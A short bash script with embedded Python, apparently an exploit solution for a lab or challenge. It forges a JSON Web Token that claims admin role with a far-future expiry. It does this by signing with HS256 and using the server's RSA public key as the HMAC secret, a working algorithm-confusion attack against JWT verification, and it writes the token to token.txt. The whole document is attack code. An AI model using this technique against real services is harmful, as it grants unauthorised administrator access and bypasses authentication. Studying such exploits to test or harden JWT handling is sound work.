#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
export OUT_DIR
python3 - <<'PY'
import base64,json,hmac,hashlib,os
secret=b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A\n-----END PUBLIC KEY-----'
def b64(x): return base64.urlsafe_b64encode(x).decode().rstrip('=')
h=b64(json.dumps({'alg':'HS256','kid':'rsa-main'},separators=(',',':')).encode())
p=b64(json.dumps({'sub':'admin','role':'admin','exp':9999999999},separators=(',',':')).encode())
s=b64(hmac.new(secret,(h+'.'+p).encode(),hashlib.sha256).digest())
open(os.path.join(os.environ['OUT_DIR'],'token.txt'),'w').write(h+'.'+p+'.'+s+'\n')
PY
